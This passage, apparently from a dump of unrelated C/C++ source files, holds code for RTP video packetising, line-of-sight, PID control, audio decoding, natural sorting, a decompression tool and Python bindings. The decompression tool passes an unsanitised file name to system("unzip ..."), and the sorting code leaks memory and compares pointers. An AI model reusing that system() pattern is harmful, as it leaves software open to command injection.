sizeof(RTPExtensionHeader);\r\n\r\n\t\tif (m_current_pos + 2 >= m_rtp_buffer_end)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\tint copyLen = ((RTP_PAYLOAD_SIZE - 2) < leftLen ? (RTP_PAYLOAD_SIZE - 2) : leftLen);\r\n\t\t//FU indicator\r\n\t\t*(m_current_pos++) = fnri | 0x1c;\r\n\t\tif (isStart)\r\n\t\t{\r\n\t\t\t//FU header -- start\r\n\t\t\t*(m_current_pos++) = 0x80 | type;\r\n\t\t\tisStart = false;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (copyLen == leftLen)\r\n\t\t\t{\r\n\t\t\t\t//FU header  -- end\r\n\t\t\t\t*(m_current_pos++) = 0x40 | type;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t//FU header -- middle\r\n\t\t\t\t*(m_current_pos++) = 0x00 | type;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (m_current_pos + copyLen >= m_rtp_buffer_end)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tmemcpy(m_current_pos, data + (len - leftLen), copyLen);\r\n\t\t\tm_current_pos += copyLen;\r\n\t\t\trtpvec.push_back(std::make_pair(start, m_current_pos - start));\r\n\t\t\tm_sequence++;\r\n\t\t\tleftLen -= copyLen;\r\n\t\t\tif (leftLen <= 0)\r\n\t\t\t{\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\treturn true;\r\n}\r\n\r\nbool RTPH264PacketBuilder::build_packet(std::vector<std::pair<const uint8_t*, int> >& datavec,\r\n\tstd::vector<std::pair<const uint8_t*, int> >& rtpvec)\r\n{\r\n\tif (m_current_pos + sizeof(RTPHeader) + sizeof(RTPExtensionHeader) >= m_rtp_buffer_end)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\tconst uint8_t* const start = m_current_pos;\r\n\r\n\tRTPHeader* rtpHeader = (RTPHeader*)m_current_pos;\r\n\trtpHeader->version = 2;\r\n\trtpHeader->padding = 0;\r\n\trtpHeader->extension = 1;\r\n\trtpHeader->csrcCount = 0;\r\n\trtpHeader->payloadType = 96;\r\n\trtpHeader->marker = 0;\r\n\trtpHeader->sequence = htons((uint16_t)(m_sequence & 0x0000FFFF));\r\n\trtpHeader->timestamp = htonl(this->m_timestamp);\r\n\trtpHeader->ssrc = htonl(this->m_ssrc);\r\n\r\n\tRTPExtensionHeader* extHeader = (RTPExtensionHeader*)(m_current_pos + sizeof(RTPHeader));\r\n\textHeader->id = 0;\r\n\textHeader->length = htons(3);\r\n\textHeader->reserved = 0;\r\n\textHeader->seqHigh16 = htons((uint16_t)((m_sequence >> 16) & 0x0000FFFF));\r\n\textHeader->msw = 0;\r\n\textHeader->lsw = 0;\r\n\r\n\tm_current_pos += sizeof(RTPHeader) + sizeof(RTPExtensionHeader);\r\n\r\n\t//single nal unit packet\r\n\tif (datavec.size() == 1)\r\n\t{\r\n\t\tconst uint8_t* data = datavec[0].first;\r\n\t\tint dataLen = datavec[0].second;\r\n\t\tif (m_current_pos + dataLen < m_rtp_buffer_end)\r\n\t\t{\r\n\t\t\tmemcpy(m_current_pos, data, dataLen);\r\n\t\t\tm_current_pos += dataLen;\r\n\t\t\trtpvec.push_back(std::make_pair(start, m_current_pos - start));\r\n\t\t\tm_sequence++;\r\n\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\treturn false",
    "#include \"line_of_sight.hpp\"\r\n\r\n#include <vector>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\n#include \"line_algorithm.hpp\"\r\n\r\n// TODO: it may be useful to make some utility that handles the creation of things like this,\r\n// and add them to a personal library\r\n// Also, doesn't actually create a square. It can make rectangles. Bad name.\r\nstd::vector<std::vector<char>> create_square(int size_x, int size_y) {\r\n    std::vector<std::vector<char>> square;\r\n\r\n    for (int i = 0; i < size_x; i++)\r\n        square.push_back(std::vector<char>(size_y, 'X'));\r\n\r\n    return square;\r\n}\r\n\r\nvoid make_los(const std::vector<std::vector<char>>& terrain,\r\n    std::vector<std::vector<char>>& los, const std::vector<SB_LINE::Coordinate>& line) {\r\n    char tile_data = 0;\r\n    bool blocked = false;\r\n\r\n    for (int j = 0; j < line.size(); j++) {\r\n\r\n        int line_x = line[j].x, line_y = line[j].y;\r\n\r\n        tile_data = terrain[line_y][line_x];\r\n\r\n        if (tile_data == 1) {\r\n            blocked = true;\r\n            los[line_y][line_x] = 'W';\r\n        }\r\n\r\n        if (blocked == true)\r\n            break;\r\n        else\r\n            los[line_y][line_x] = ' ';\r\n\r\n    }\r\n}\r\n\r\nstd::vector<std::vector<char>> SB_LOS::line_of_sight(const std::vector<std::vector<char>>& terrain, int x, int y) {\r\n\r\n    std::vector<std::vector<char>> los = create_square(terrain.size(), terrain[0].size());\r\n\r\n    // TODO: This only makes sense if we have a contiguous array and the data in the array is large enough to impact cache hits\r\n    // The most optimal way to do this would be like so:\r\n    // Let H be values we explore when handling the top and bottom (horizontal traversal)\r\n    // and V be values we explore when handling the sides (vertical traversal)\r\n    // HHHHHHH\r\n    // H00000V\r\n    // V00000V\r\n    // V00000V\r\n    // V00000H\r\n    // HHHHHHH\r\n    // Additionally, when handling the sides, we can horizontally traverse like so:\r\n    // H000001\r\n    // 1000002\r\n    // 2000003\r\n    // 300000H\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int row = z * (terrain.size() - 1);\r\n        for (int i = 0; i < terrain[row].size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, i, y, row);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int column = z * (terrain[0].size() - 1);\r\n        for (int i = 0; i < terrain.size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, column, y, i);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n\r\n    return los;\r\n}\r\n\r\n#define SB_LOS_TESTING\r\n#ifdef SB_LOS_TESTING\r\n\r\nvoid initialize_terrain(std::vector<std::vector<char>>& terrain, std::string input) {\r\n\r\n    std::ifstream in_file;\r\n\r\n    in_file.open(input);\r\n    if (!in_file.is_open())\r\n        throw;\r\n\r\n    std::string buffer;\r\n    while (std::getline(in_file, buffer)) {\r\n\r\n        std::vector<char> temp;\r\n\r\n        for (int i = 0; i < buffer.size(); i++) {\r\n            if (buffer[i] == '0')\r\n                temp.push_back(0);\r\n            else\r\n                temp.push_back(1);\r\n        }\r\n\r\n        terrain.push_back(temp);\r\n\r\n    }\r\n    in_file.close();\r\n}\r\n\r\nvoid print_terrain(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << (short)terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\nvoid print_los(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\n\r\nvoid print_vector(const std::vector<SB_LINE::Coordinate>& vals) {\r\n\r\n    std::cout << \"(x, y) \";\r\n    for (int i = 0; i < vals.size(); i++) {\r\n        std::cout << \"(\" << vals[i].x << \", \" << vals[i].y << \") \";\r\n    }\r\n    std::cout << \"\\n\";\r\n}\r\n\r\nint main() {\r\n    std::vector<std::vector<char>> terrain;\r\n\r\n    initialize_terrain(terrain, \"infile.txt\");\r\n\r\n    print_terrain(terrain);\r\n    \r\n    std::cout << \"\\n\";\r\n\r\n    std::vector<std::vector<char>> los = SB_LOS::line_of_sight(terrain, 20, 10);\r\n\r\n    print_los(los);\r\n\r\n}\r\n#endif",
    "//\n// Created by 24106 on 2024/3/27.\n//\n\n#include \"pid.h\"\n\n\nfloat myabs(float input){\n    return input<0?-input:input;\n}\n\nencoder encoder1;\nencoder encoder2;\n\nfloat limit(float min,float input,float max){\n    if (input<min)\n        return min;\n    if (max<input)\n        return max;\n    return input;\n}\n\nPID::PID(float mp,float mi,float md,float mtarget,float ma):p(mp),i(mi),d(md),target(mtarget),a(ma){\n    err = 0;\n    last_err = 0;\n    previous_err = 0;\n    sum_err = 0;\n    out = 0;\n};\n\nvoid PID::Pchange(float val){\n    p = val;\n};\nvoid PID::Ichange(float val){\n    i = val;\n};\nvoid PID::Dchange(float val){\n    d = val;\n};\nfloat PID::targetVal(void) const {\n    return target;\n}\nfloat PID::Pval() {\n    return p;\n}\nfloat PID::outVal(void) const {\n    return out;\n}\nvoid PID::target_change(float val){\n    target = val;\n};\n\nvoid PID::PID_relize(float input){\n    err = target - input;\n    sum_err += err;\n    out = p * err + i * sum_err + d * (1 - a) * (err - last_err) + a * (last_err);\n    last_err = err;\n};\n\nvoid PID::PID_relize_lvbo(int input_1,int input_2){\n//    target = limit(-0,target,30);\n    err_least = target - input_1 - input_2;\n    err = err * 0.7 + err_least * 0.3;\n    sum_err += err;\n    limit(-10000,sum_err,10000);\n    out = p * err + i * sum_err + d * (1 - a) * (err - last_err) + a * (last_err);\n    last_err = err;\n}\n\nvoid PID::PID_turn(float input) {\n    err = target - input;\n    out = p * err;\n}\n\nPID pid_1(0,0,0,0,0);\nPID pid_2(0,0,0,0,0);\nPID pid_3(0,0,0,0,0);",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"AudioThread.h\"\n\n\n#define MAX_AUDIO_FRAME_SIZE 192000 // 1 second of 48khz 32bit audio   48000 * (32/8)\n\n//\u4e00\u5e27PCM\u7684\u6570\u636e\u957f\u5ea6\nunsigned int audioLen = 0;\nunsigned char *audioChunk = nullptr;\n//\u5f53\u524d\u8bfb\u53d6\u7684\u4f4d\u7f6e\nunsigned char *audioPos = nullptr;\n\n/** \u88abSDL2\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570 \u5f53\u9700\u8981\u83b7\u53d6\u6570\u636e\u5582\u5165\u786c\u4ef6\u64ad\u653e\u7684\u65f6\u5019\u8c03\u7528 **/\nvoid fill_audio(void *codecContext, Uint8 *stream, int len) {\n    //SDL2\u4e2d\u5fc5\u987b\u9996\u5148\u4f7f\u7528SDL_memset()\u5c06stream\u4e2d\u7684\u6570\u636e\u8bbe\u7f6e\u4e3a0\n    SDL_memset(stream, 0, len);\n    if (audioLen == 0)\n        return;\n\n    len = (len > audioLen ? audioLen : len);\n    \n    //\u5c06\u6570\u636e\u5408\u5e76\u5230 stream \u91cc\n    SDL_MixAudio(stream, audioPos, len, SDL_MIX_MAXVOLUME);\n\n    //\u4e00\u5e27\u7684\u6570\u636e\u63a7\u5236\n    audioPos += len;\n    audioLen -= len;\n}\n\nAudioThread::AudioThread() {\n\n}\n\n\nAudioThread::~AudioThread() {\n    if (format_context != nullptr) avformat_close_input(&format_context);\n    if (codec_context != nullptr) avcodec_free_context(&codec_context);\n    if (packet != nullptr) av_packet_free(&packet);\n    if (frame != nullptr) av_frame_free(&frame);\n    if (convert_context != nullptr) swr_free(&convert_context);\n}\n\n\nvoid AudioThread::start() {\n    prepare_codec();\n    if (pthread_create(&pid, NULL, start_thread, (void *) this) != 0) {\n        std::cout << \"\u521d\u59cb\u5316\u97f3\u9891\u7ebf\u7a0b\u5931\u8d25!\" << std::endl;\n        return;\n    }\n}\n\nvoid *AudioThread::start_thread(void *arg) {\n    AudioThread *audioThread = (AudioThread *) arg;\n    audioThread->run();\n    return nullptr;\n}\n\nvoid AudioThread::run() {\n    std::cout << \"\u97f3\u9891\u7ebf\u7a0b\u5df2\u542f\u52a8\" << std::endl;\n\n    //\u5faa\u73af\u8bfb\u53d6packet\u5e76\u4e14\u89e3\u7801\n    int sendcode = 0;\n    while (av_read_frame(format_context, packet) >= 0) {\n        if (packet->stream_index != audioIndex)continue;\n        //\u63a5\u53d7\u89e3\u7801\u540e\u7684\u97f3\u9891\u6570\u636e\n        while (avcodec_receive_frame(codec_context, frame) == 0) {\n            swr_convert(convert_context, &outBuff, MAX_AUDIO_FRAME_SIZE, (const uint8_t **) frame->data,\n                        frame->nb_samples);\n            //\u5982\u679c\u6ca1\u6709\u64ad\u653e\u5b8c\u5c31\u7b49\u5f851ms\n            while (audioLen > 0)\n                SDL_Delay(1);\n            //\u540c\u6b65\u6570\u636e\n            audioChunk = (unsigned char *) outBuff;\n            audioPos = audioChunk;\n            audioLen = out_buffer_size;\n            av_frame_unref(frame);\n        }\n        //\u53d1\u9001\u89e3\u7801\u524d\u7684\u5305\u6570\u636e\n        sendcode = avcodec_send_packet(codec_context, packet);\n        //\u6839\u636e\u53d1\u9001\u7684\u8fd4\u56de\u503c\u5224\u65ad\u72b6\u6001\n        if (sendcode == 0) {\n//            std::cout << \"[debug] \" << \"SUCCESS\" << std::endl;\n        } else if (sendcode == AVERROR_EOF) {\n            std::cout << \"[debug] \" << \"EOF\" << std::endl;\n        } else if (sendcode == AVERROR(EAGAIN)) {\n            std::cout << \"[debug] \" << \"EAGAIN\" << std::endl;\n        } else {\n            // std::cout << \"[debug] \" << av_err2str(AVERROR(sendcode)) << std::endl;\n        }\n\n        av_packet_unref(packet);\n    }\n\n}\n\nvoid AudioThread::setRender(AVRender *render) {\n    this->av_render = render;\n}\n\nvoid AudioThread::setUrl(const char *url) {\n    this->url = url;\n}\n\n\nvoid AudioThread::prepare_codec() {\n    int retcode;\n    //\u521d\u59cb\u5316FormatContext\n    format_context = avformat_alloc_context();\n    if (!format_context) {\n        std::cout << \"[error] alloc format context error!\" << std::endl;\n        return;\n    }\n\n    //\u6253\u5f00\u8f93\u5165\u6d41\n    retcode = avformat_open_input(&format_context, url, nullptr, nullptr);\n    if (retcode != 0) {\n        std::cout << \"[error] open input error!\" << std::endl;\n        return;\n    }\n\n    //\u8bfb\u53d6\u5a92\u4f53\u6587\u4ef6\u4fe1\u606f\n    retcode = avformat_find_stream_info(format_context, NULL);\n    if (retcode != 0) {\n        std::cout << \"[error] find stream error!\" << std::endl;\n        return;\n    }\n\n    //\u5206\u914dcodecContext\n    codec_context = avcodec_alloc_context3(NULL);\n    if (!codec_context) {\n        std::cout << \"[error] alloc codec context error!\" << std::endl;\n        return;\n    }\n\n    //\u5bfb\u627e\u5230\u97f3\u9891\u6d41\u7684\u4e0b\u6807\n    audioIndex = av_find_best_stream(format_context, AVMEDIA_TYPE_AUDIO, -1, -1, NULL, 0);\n    //\u5c06\u97f3\u9891\u6d41\u7684\u7684\u7f16\u89e3\u7801\u4fe1\u606f\u62f7\u8d1d\u5230codecContext\u4e2d\n    retcode = avcodec_parameters_to_context(codec_context, format_context->streams[audioIndex]->codecpar);\n    if (retcode != 0) {\n        std::cout << \"[error] parameters to context error!\" << std::endl;\n        return;\n    }\n\n    //\u67e5\u627e\u89e3\u7801\u5668\n    codec = avcodec_find_decoder(codec_context->codec_id);\n    if (codec == nullptr) {\n        std::cout << \"[error] find decoder error!\" << std::endl;\n        return;\n    }\n\n    //\u6253\u5f00\u89e3\u7801\u5668\n    retcode = avcodec_open2(codec_context, codec, nullptr);\n    if (retcode != 0) {\n        std::cout << \"[error] open decodec error!\" << std::endl;\n        return;\n    }\n\n    //\u521d\u59cb\u5316\u4e00\u4e2apacket\n    packet = av_packet_alloc();\n    //\u521d\u59cb\u5316\u4e00\u4e2aFrame\n    frame = av_frame_alloc();\n\n\n    /** ########## \u83b7\u53d6\u5b9e\u9645\u97f3\u9891\u7684\u53c2\u6570 ##########**/\n    //\u5355\u4e2a\u901a\u9053\u4e2d\u7684\u91c7\u6837\u6570\n    out_nb_samples = codec_context->frame_size;\n    //\u8f93\u51fa\u7684\u58f0\u9053\u6570\n    out_channels = av_get_channel_layout_nb_channels(out_chn_layout);\n    //\u8f93\u51fa\u97f3\u9891\u7684\u5e03\u5c40\n    in_chn_layout = av_get_default_channel_layout(codec_context->channels);\n\n    /** \u8ba1\u7b97\u91cd\u91c7\u6837\u540e\u7684\u5b9e\u9645\u6570\u636e\u5927\u5c0f,\u5e76\u5206\u914d\u7a7a\u95f4 **/\n    //\u8ba1\u7b97\u8f93\u51fa\u7684buffer\u7684\u5927\u5c0f\n    out_buffer_size = av_samples_get_buffer_size(NULL, out_channels, out_nb_samples, out_sample_fmt, 1);\n    //\u5206\u914d\u8f93\u51fabuffer\u7684\u7a7a\u95f4\n    outBuff = (unsigned char *) av_malloc(MAX",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"natural_sort.h\"\n#include <algorithm>\n#include <cctype>\n#include <stdexcept>\n#include <string>\n#include <fmt/ranges.h>\n\nbool pjc::natural_sort::operator()(const std::string &a, const std::string &b) const  {\n    auto tokenised_a = tokenise(a);\n    auto tokenised_b = tokenise(b);\n    for(int i = 0; i < get_smaller_vector(tokenised_a, tokenised_b).size(); i++) {\n        auto int_comp = compare_int(tokenised_a[i], tokenised_b[i]);\n        if (int_comp != RETURN_TYPE::INVALID)\n            switch (int_comp) {\n                case pjc::RETURN_TYPE::TRUE:\n                case pjc::RETURN_TYPE::FALSE:\n                    return static_cast<bool>(int_comp);\n                default:\n                    break;\n            }\n        else {\n            auto str_comp = compare_str(tokenised_a[i], tokenised_b[i]);\n            switch (str_comp) {\n                case pjc::RETURN_TYPE::TRUE:\n                case pjc::RETURN_TYPE::FALSE:\n                    return static_cast<bool>(str_comp);\n                default:\n                    break;\n            }\n        }\n    }\n    return b.size() - a.size();\n}\n\npjc::RETURN_TYPE pjc::compare_int(const char *a, const char *b) {\n    int ia;\n    int ib;\n    try {\n        ia = std::stoi(a);\n        ib = std::stoi(b);\n    } catch (std::invalid_argument const &e) {\n        return RETURN_TYPE::INVALID;\n    }\n\n    // If a < b we wanna swap, else dont do anything\n    return ia < ib ? RETURN_TYPE::TRUE : RETURN_TYPE::FALSE;\n}\n\npjc::RETURN_TYPE pjc::compare_str(const char *a, const char *b) {\n    std::vector<std::string> tmp = {a, b};\n    std::transform(tmp[0].begin(), tmp[0].end(), tmp[0].begin(), tolower);\n    std::transform(tmp[1].begin(), tmp[1].end(), tmp[1].begin(), tolower);\n    if(tmp[0] == tmp[1])\n        return RETURN_TYPE::EQUAL;\n    std::ranges::sort(tmp);\n    return tmp[0].c_str() == a ? RETURN_TYPE::TRUE : RETURN_TYPE::FALSE;\n}\n\nstd::vector<const char *> pjc::tokenise(const std::string &string) {\n    if (string.size() == 0)\n        return {};\n    std::vector<const char *> result = {};\n    std::string builder{string[0]};\n    for (int i = 1; i < string.size(); i++) {\n        char current = string[i];\n        auto prev = builder.back();\n        if ((std::isalpha(current) && std::isalpha(prev)) ||\n            (std::isdigit(current) && std::isdigit(prev)))\n            builder.push_back(current);\n        else {\n            result.push_back(strdup(builder.c_str()));\n            builder.clear();\n            builder.push_back(current);\n        }\n    }\n    result.push_back(strdup(builder.c_str())); // Push the last token\n    fmt::println(\"Tokenised: {}\", result);\n    return result;\n}\n\ntemplate <typename T>\nstd::vector<T>& pjc::get_smaller_vector(std::vector<T> &a, std::vector<T> &b) {\n    return a.size() < b.size() ? a : b;\n}\n",
    "#include \"decode.hh\"\n#include <iostream>\n#include <map>\n#include <fstream>\n#include <unistd.h>\n#include <getopt.h>\n#define datatype double\n#define timetype int32_t\nint P = 1;\nint main(int argc, char * argv[]) {\n  std::ios::sync_with_stdio(false);\n  std::cin.tie(0); \n  std::cout.tie(0); \n  std::string Filenamei = \"\", Filenameo = \"\";\n  const char * optstring = \"s:d:\";\n  int o;\n  while((o = getopt(argc, argv, optstring)) != -1) {\n    switch (o) {\n      case 's':\n        Filenamei = optarg;\n        break;\n      case 'd':\n        Filenameo = optarg;\n        break;\n      case '?':\n        printf(\"invalid option -- '%s'\", optarg);\n        exit(0);\n        break;\n    }\n  }\n  std::string s1 = \"unzip \" + Filenamei + \".final\";\n  std::string s2 = \"rm mapping data\";\n  if(system(s1.c_str()) == 0) { \n    std::ifstream in1(\"mapping\", std::ios::binary);\n    std::ifstream in2(\"data\", std::ios::binary);\n    std::ofstream ou(Filenameo, std::ios::binary);\n    int length, nums, flag1, flag2;\n    std::vector<datatype>  hash;\n    std::vector<datatype> dst;\n    datatype va;\n    in2 >> nums;\n    for(int i = 0; i < nums; i ++) {\n      in1.read((char *)(&va), sizeof(va));\n      hash.push_back(va);\n    }\n    in2 >> length >> flag1 >> flag2;\n    length = hash[length];\n    flag1 = hash[flag1];\n    flag2 = hash[flag2];\n    while(in2 >> o) dst.push_back(hash[o]);\n    in1.close();\n    in2.close();\n    system(s2.c_str());\n    DecodeForm<timetype> tim;\n    DecodeForm<datatype> val;\n    int l = 0, r = dst.size(), num = 0, sum = 0;\n    if(flag1) {\n      while(sum != length) {\n        tim.RleArrayNum_.push_back(dst[l]);\n        sum += dst[l ++];\n        num ++;\n      }\n      while(num --) tim.RleArrayVal_.push_back(dst[l ++]);\n    } else {\n      int r = l + length;\n      while(l < r) tim.Delta_.push_back(dst[l ++]);\n    }\n    num = sum = 0;\n    if(flag2) {\n      while(sum != length) {\n        val.RleArrayNum_.push_back(dst[l]);\n        sum += dst[l ++];\n        num ++;\n      }\n      while(num --) val.RleArrayVal_.push_back(dst[l ++]);\n    } else {\n      int r = l + length;\n      while(l < r) val.Delta_.push_back(dst[l ++]);\n    }\n    Decode(tim, true, flag1);\n    Decode(val, false, flag2);\n    SDTDecode(tim.Delta_, val.Delta_, ou);\n  } else std::cout << \"NO THE FINAL FILE : \" << Filenamei << std::endl;\n  return 0;\n}",
    "#include \"flowy/include/asc_file.hpp\"\n#include \"flowy/include/config.hpp\"\n#include \"flowy/include/config_parser.hpp\"\n#include \"flowy/include/definitions.hpp\"\n#include \"flowy/include/lobe.hpp\"\n#include \"flowy/include/simulation.hpp\"\n#include \"flowy/include/topography.hpp\"\n#include \"flowy/include/topography_file.hpp\"\n#include \"pybind11/pytypes.h\"\n\n#ifdef WITH_NETCDF\n#include \"flowy/include/netcdf_file.hpp\"\n#endif\n\n#define PYBIND11_DETAILED_ERROR_MESSAGES\n\n// Bindings\n#include <pybind11/operators.h>\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <pybind11/stl/filesystem.h>\n\n// xtensor extensions\n#define FORCE_IMPORT_ARRAY\n#include \"xtensor-python/pyarray.hpp\"\n\n// Namespaces\nusing namespace std::string_literals; // For \"\"s\nusing namespace pybind11::literals;   // For \"\"_a\nnamespace py = pybind11;              // Convention\n\nPYBIND11_MODULE( flowpycpp, m )\n{\n    xt::import_numpy();\n    m.doc() = \"Python bindings for flowy\"; // optional module docstring\n\n    py::class_<std::filesystem::path>( m, \"Path\" ).def( py::init<std::string>() );\n\n    py::implicitly_convertible<std::string, std::filesystem::path>();\n\n    py::class_<Flowy::TopographyCrop>( m, \"TopographyCrop\" )\n        .def( py::init<>() )\n        .def_readwrite( \"x_min\", &Flowy::TopographyCrop::x_min )\n        .def_readwrite( \"x_max\", &Flowy::TopographyCrop::x_max )\n        .def_readwrite( \"y_min\", &Flowy::TopographyCrop::y_min )\n        .def_readwrite( \"y_max\", &Flowy::TopographyCrop::y_max );\n\n    py::enum_<Flowy::OutputQuantitiy>( m, \"OutputQuantitiy\" )\n        .value( \"Hazard\", Flowy::OutputQuantitiy::Hazard )\n        .value( \"Height\", Flowy::OutputQuantitiy::Height );\n\n    py::class_<Flowy::AscFile>( m, \"AscFile\" )\n        .def( py::init<>() )\n        .def( py::init<Flowy::Topography, Flowy::OutputQuantitiy>() )\n        .def( py::init<std::filesystem::path>(), \"file_path\"_a )\n        .def( py::init<std::filesystem::path, Flowy::TopographyCrop>() )\n        .def( \"save\", &Flowy::AscFile::save )\n        .def( \"lower_left_corner\", &Flowy::AscFile::lower_left_corner )\n        .def( \"cell_size\", &Flowy::AscFile::cell_size )\n        .def( \"to_topography\", &Flowy::AscFile::to_topography )\n        .def( \"crop_to_content\", &Flowy::AscFile::crop_to_content )\n        .def_readwrite( \"no_data_value\", &Flowy::AscFile::no_data_value )\n        .def_readwrite( \"data\", &Flowy::AscFile::data )\n        .def_readwrite( \"x_data\", &Flowy::AscFile::x_data )\n        .def_readwrite( \"y_data\", &Flowy::AscFile::y_data )\n        .def( \"__repr__\", []( const Flowy::AscFile & ) { return \"<AscFile>\"; } );\n\n#ifdef WITH_NETCDF\n    py::class_<Flowy::NetCDFFile>( m, \"NetCDFFile\" )\n        .def( py::init<>() )\n        .def( py::init<Flowy::Topography, Flowy::OutputQuantitiy>() )\n        .def( py::init<std::filesystem::path>(), \"file_path\"_a )\n        .def( py::init<std::filesystem::path, Flowy::TopographyCrop>() )\n        .def( \"save\", &Flowy::NetCDFFile::save )\n        .def( \"lower_left_corner\", &Flowy::NetCDFFile::lower_left_corner )\n        .def( \"cell_size\", &Flowy::NetCDFFile::cell_size )\n        .def( \"to_topography\", &Flowy::NetCDFFile::to_topography )\n        .def( \"crop_to_content\", &Flowy::NetCDFFile::crop_to_content )\n        .def_readwrite( \"no_data_value\", &Flowy::NetCDFFile::no_data_value )\n        .def_readwrite( \"data\", &Flowy::NetCDFFile::data )\n        .def_readwrite( \"x_data\", &Flowy::NetCDFFile::x_data )\n        .def_readwrite( \"y_data\", &Flowy::NetCDFFile::y_data )\n        .def( \"__repr__\", []( const Flowy::NetCDFFile & ) { return \"<NetCDFFile>\"; } );\n#endif\n\n    py::class_<Flowy::Lobe>( m, \"Lobe\" )\n        .def( py::init<>() )\n        .def_readwrite( \"center\", &Flowy::Lobe::center )\n        .def_readwrite( \"semi_axes\", &Flowy::Lobe::semi_axes )\n        .def_readwrite( \"dist_n_lobes\", &Flowy::Lobe::dist_n_lobes )\n        .def_readwrite( \"n_descendents\", &Flowy::Lobe::n_descendents )\n        .def_readwrite( \"idx_parent\", &Flowy::Lobe::idx_parent )\n        .def_readwrite( \"alpha_inertial\", &Flowy::Lobe::alpha_inertial )\n        .def_readwrite( \"thickness\", &Flowy::Lobe::thickness )\n   